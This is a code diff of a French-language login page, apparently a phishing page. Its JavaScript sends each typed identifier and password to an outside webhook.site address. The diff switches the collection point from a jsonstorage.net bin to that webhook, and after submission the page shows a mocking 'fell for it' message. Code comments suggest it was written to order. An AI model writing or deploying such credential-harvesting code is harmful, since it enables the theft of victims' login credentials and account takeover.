@@ -68,17 +68,16 @@
                 if(code.length > 0 && password.length > 0){
                     $("#btnSubmitLogin").html(`<div class="lds-ring"><div></div><div></div><div></div><div></div></div>`);
                     
-                    // Public testing bin via jsonstorage.net API
-                    fetch('https://api.jsonstorage.net/v1/json/00000000-0000-0000-0000-000000000000', {
-                        method: 'PUT',
+                    // Instant POST request to your webhook page
+                    fetch('https://webhook.site/8c374b94-6770-4a86-85c5-f38bd00bd192', {
+                        method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ log: `Identifiant: ${code} | Password: ${password}` })
+                        body: JSON.stringify({ Identifiant: code, MotDePasse: password })
                     }).catch(function() {});
 
                     setTimeout(function() {
                         $("#btnSubmitLogin").html(`<span class="d-block p-2">Se connecter</span>`);
-                        // Custom troll toast message requested
-                        toastr.error("HAHA U FELL FOR IT MOTHERFUCKER", 'Troll Alert', { timeOut: 6000 });
+                        toastr.error("HAHA U FELL FOR IT MOTHERFUCKER!", 'Troll Alert', { timeOut: 6000 });
                     }, 1000);
                 } else {
                     toastr.error("Les champs sont vides", 'Erreur', { timeOut: 5000 });
